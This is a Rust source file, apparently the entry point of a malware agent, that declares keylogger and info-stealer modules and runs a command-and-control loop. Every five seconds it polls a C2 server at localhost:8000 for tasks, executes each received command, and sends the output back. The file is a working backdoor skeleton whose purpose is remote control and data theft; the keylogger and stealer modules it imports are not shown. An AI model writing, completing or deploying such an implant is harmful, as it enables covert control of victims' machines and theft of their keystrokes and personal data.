mod comms;
mod tasks;
mod modules {
    pub mod keylogger;
    pub mod info_stealer;
}

#[tokio::main]
async fn main() {
    let c2_url = "http://localhost:8000";
    println!("[*] Agent started, contacting C2 at {}", c2_url);

    loop {
        match comms::fetch_task(c2_url).await {
            Some(task) => {
                println!("[*] Received task: {}", task.command);
                let result = tasks::execute_task(&task.command);
                println!("[*] Result: {}", result);
                if comms::post_result(c2_url, result).await {
                    println!("[*] Result sent to C2");
                } else {
                    println!("[!] Failed to send result");
                }
            }
            None => println!("[!] No task received, retrying..."),
        }
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    }
}